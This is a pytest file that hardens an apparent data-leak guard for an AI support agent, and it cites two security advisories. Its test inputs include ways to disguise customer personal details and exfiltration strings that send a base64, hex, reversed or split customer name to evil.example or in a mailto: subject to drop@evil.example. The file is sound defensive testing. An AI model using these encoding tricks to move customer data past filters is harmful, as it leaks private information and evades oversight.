# Copyright 2026 AgentP-Codes
# SPDX-License-Identifier: AGPL-3.0-only
"""0.7 hardening, from the live test and the security review."""

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "deploy" / "live"))
import fake_company  # noqa: E402
import live  # noqa: E402

from eurycleia import Blocked, Policy, Vault  # noqa: E402


@pytest.fixture
def task():
    co = fake_company.make(seed=5, inbox="a.b@gmail.com", customers=3)
    c = co["customers"][0]
    rec = {"firstname": c["first"], "lastname": c["last"], "email": c["email"], "phone": c["phone"],
           "address": c["address"].split(",")[0], "city": c["address"].split(",")[1].strip(), "plan": c["plan"],
           "private_notes": c["private_notes"], "customer_id": c["customer_id"]}
    v = Vault(Policy.load(live.POLICY),
              {"crm.customer": lambda k: rec if k == c["customer_id"] else None,
               "inbox.ticket": lambda k: {"ticket_id": k, "subject": "s", "body": "b"}, "docs": lambda n: None},
              {"email.send": lambda **a: None, "payments.refund": lambda **a: None, "chat.post": lambda **a: None},
              mode="enforce")
    t = v.start_task("support_reply", customer_id=c["customer_id"], ticket_id="T1", payment_intent="pi_1",
                     support_channel="C1")
    t.read("crm.customer", c["customer_id"])
    return t, rec


@pytest.mark.parametrize("how", [
    lambda r: r["phone"].replace(" ", ""),                      # 0255504579
    lambda r: r["phone"].replace(" ", "-"),                     # 02-5550-4579
    lambda r: " ".join(r["phone"].replace(" ", "")),            # 0 2 5 5 5 0 4 5 7 9
    lambda r: r["address"].replace(" ", "  "),                  # extra spaces
    lambda r: r["email"].replace("@", " at ").replace(".com", " dot com"),
    lambda r: r["email"].replace("@", " (at) "),
    lambda r: "".join(chr(ord(x) + 0xFEE0) for x in r["phone"].replace(" ", "")),   # fullwidth digits
    lambda r: "\u200b".join(r["phone"]),                                            # zero-width spaces
    lambda r: r["phone"].replace(" ", "")[::-1],                                     # backwards
    lambda r: " ".join("zero one two three four five six seven eight nine".split()[int(d)]
                       for d in r["phone"] if d.isdigit()),                         # in words
])
def test_reformatted_personal_details_are_still_caught(task, how):
    t, rec = task
    with pytest.raises(Blocked):
        t.act("chat.post", channel="C1", text=f"FYI: {how(rec)}")


def test_ordinary_notes_still_go_through(task):
    t, _rec = task
    t.act("chat.post", channel="C1", text="Ticket T1: refund-window question answered, no refund issued.")


# ---- GHSA-fh5g-34xr-j73j: a sink with no recipient argument carried protected data anywhere
def _comment_vault(sent):
    policy = Policy.from_dict({
        "version": 1,
        "sources": {"crm.customer": {"owner": "customer_id", "owner_contact": "email",
                                     "fields": {"name": "protected", "email": "protected", "plan": "normal"}}},
        "tasks": {"reply": {"trusted": ["customer_id"],
                            "reads": {"crm.customer": {"key": "{customer_id}", "fields": ["name", "email", "plan"]}},
                            "sinks": {"ticket.comment": {"args": ["ticket_id", "body"]}}}},
    })
    rec = {"12": {"name": "Ann Smithers", "email": "ann@customer.example", "plan": "Pro"}}
    return Vault(policy, {"crm.customer": lambda k: rec.get(str(k))},
                 {"ticket.comment": lambda **a: sent.append(a)}, mode="enforce")


def test_a_sink_without_a_recipient_cant_carry_protected_data():
    sent = []
    t = _comment_vault(sent).start_task("reply", customer_id="12")
    c = t.read("crm.customer", "12")
    for body in (f"Customer email: {c['email']}", "Customer email: ann@customer.example",
                 "Customer: ANN SMITHERS"):
        with pytest.raises(Blocked):
            t.act("ticket.comment", ticket_id="99999", body=body)
    t.act("ticket.comment", ticket_id="99999", body=f"Plan checked: {c['plan']}")   # non-personal data is fine
    assert sent == [{"ticket_id": "99999", "body": "Plan checked: Pro"}]


# ---- GHSA-4q9w-8vgq-gw4v: customer data in encoded or split links, or a mailto: subject
def _email_vault(sent):
    policy = Policy.from_dict({
        "version": 1, "internal_domains": ["company.example"],
        "sources": {"crm.customer": {"owner": "customer_id", "owner_contact": "email",
                                     "fields": {"name": "protected", "email": "protected"}}},
        "tasks": {"reply": {"trusted": ["customer_id"],
                            "reads": {"crm.customer": {"key": "{customer_id}", "fields": ["name", "email"]}},
                            "sinks": {"email.send": {"recipient_arg": "to", "args": ["to", "body"],
                                                     "allowed_recipients": ["crm.customer:{customer_id}.email"]}}}},
    })
    rec = {"12": {"name": "Ann Smithers", "email": "ann@customer.example"}}
    return Vault(policy, {"crm.customer": lambda k: rec.get(str(k))},
                 {"email.send": lambda **a: sent.append(a)}, mode="enforce")


def _b64(s):
    import base64
    return base64.b64encode(s.encode()).decode()


@pytest.mark.parametrize("body", [
    "See https://evil.example/?d=" + _b64("Ann Smithers"),
    "See https://evil.example/?d=" + _b64("Ann Smithers").rstrip("="),
    "See https://evil.example/?d=" + b"Ann Smithers".hex(),
    "See https://evil.example/?d=" + "srehtimS nnA".replace(" ", "%20"),
    "See https://evil.example/a?w=Ann and https://evil.example/b?w=Smithers",
    "Write to <a href='mailto:drop@evil.example?subject=Ann%20Smithers'>us</a>",
    "mailto:drop@evil.example?subject=Ann%20Smithers",
    "mailto:drop@evil.example?subject=Ann+Smithers&body=hi",
])
def test_customer_data_in_encoded_or_split_links_is_blocked(body):
    sent = []
    t = _email_vault(sent).start_task("reply", customer_id="12")
    t.read("crm.customer", "12")
    with pytest.raises(Blocked):
        t.act("email.send", to="ann@customer.example", body=body)
    assert sent == []


def test_ordinary_links_and_mailto_to_the_company_still_go_through():
    sent = []
    t = _email_vault(sent).start_task("reply", customer_id="12")
    c = t.read("crm.customer", "12")
    t.act("email.send", to=c["email"], body="Track it at https://tracking.example/abc123 or "
                                             "mailto:help@company.example?subject=Ann%20Smithers")
    t.act("email.send", to=c["email"], body="Hi Ann Smithers, see https://help.example/refunds")
    assert len(sent) == 2
